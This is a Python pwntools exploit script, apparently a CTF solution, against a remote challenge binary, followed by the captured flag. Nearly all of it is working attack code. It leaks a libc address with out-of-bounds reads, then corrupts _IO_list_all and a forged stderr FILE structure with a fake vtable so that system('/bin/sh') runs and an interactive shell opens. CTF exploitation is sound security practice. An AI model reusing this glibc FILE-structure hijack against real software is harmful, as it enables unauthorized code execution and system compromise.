#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

#r = process(["./engineTest", "none", "none", "none", "none"])
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote('202.120.7.199', 24680)
libc = ELF("./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1")

ip = []
op = []
stdin = ""

def write_byte(offset, val):
    for i in range(8):
        ip.append(offset * 8 + i)

    global stdin
    stdin += val

def read_byte(offset):
    for i in range(8):
        op.append(offset * 8 + i)

def write(offset, val):
    for i, v in enumerate(val):
        write_byte(offset + i, v)

def read(offset, len):
    for i in range(len):
        read_byte(offset + i)

# offset 2 libc
#libc_offset = 0x50a000 - 0x10
#wide_data_offset = 0x3C3660
libc_offset = 0x502000 - 0x10
wide_data_offset = 0x3A6140
stderr_offset = libc.symbols["_IO_2_1_stderr_"]

read(libc_offset + libc.symbols["stderr"], 8)     # leak stderr

# overwrite _IO_list_all, points to stderr - 0x38
# this makes stderr->vtable points to _IO_wide_data_2
write(libc_offset + libc.symbols["_IO_list_all"], p8(stderr_offset-0x38 & 0xff))
# set data on fake stderr to trigger _IO_file_underflow
write(libc_offset + stderr_offset-0x38+0x20, p64(0))   # fp->_IO_write_ptr
write(libc_offset + stderr_offset-0x38+0x28, p64(1))   # fp->_IO_write_base
# put vtable on _IO_wide_data_2
write(libc_offset + wide_data_offset+24, p64(0x400CC0))   # fake _IO_file_underflow


# cp
mem_size = 0x200000 # trigger mmap
cp = [[1, 0, 0, 0, 2]]
r.send(p64(mem_size * 8))
r.send(p64(len(cp)))
r.send(flat(cp))

# ip
r.send(p64(len(ip)))
r.send(flat(ip))
if ip:
    r.send(stdin)
#print hexdump(ip)

# op
r.send(p64(len(op)))
r.send(flat(op))
#if op:
#    print "Response:\n" + r.recvn(len(op)-1)

libc_stderr = u64(r.recvn(8))
libc_base = libc_stderr - libc.symbols["_IO_2_1_stderr_"]
libc_system = libc_base + libc.symbols["system"]

# gets(fake_stderr)
# overwrite fake_stderr again
fake_stderr = [
    '/bin/sh\0', # _flags = 0xfbad2087,
    0, # _IO_read_ptr = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_read_end = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    libc_system, # _IO_read_base = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_write_base = 0x401703 "h<@",
    1, # _IO_write_ptr = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_write_end = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_buf_base = 0x7ffff783a5c3 <_IO_2_1_stderr_+131> "",
    0, # _IO_buf_end = 0x7ffff783a5c4 <_IO_2_1_stderr_+132> "",
    0, # _IO_save_base = 0x0,
    0, # _IO_backup_base = 0x0,
    0, # _IO_save_end = 0x0,
    0, # _markers = 0x0,
    libc_stderr-0x38, # _chain = 0x7ffff783a620 <_IO_2_1_stdout_>,
    2, # _fileno = 0x2, _flags2 = 0x0,
    -1, # _old_offset = 0xffffffffffffffff,
    0, # _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = "",
    0, # _lock = 0x7ffff783b770 <_IO_stdfile_2_lock>,
    -1, # _offset = 0xffffffffffffffff,
    0, # _codecvt = 0x0,
    0, # _wide_data = 0x7ffff7839660 <_IO_wide_data_2>,
    0, # _freeres_list = 0x0,
    0, # _freeres_buf = 0x0,
    0, # __pad5 = 0x0,
    0, # _mode = 0x0,
    0, 0,
    libc_stderr-0x38  # fake vtable addr
]
r.sendline(flat(fake_stderr))

r.interactive()

# flag{The_Road_Fr0m_Circuit_70_sh5ll}
#Linux CTF 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux
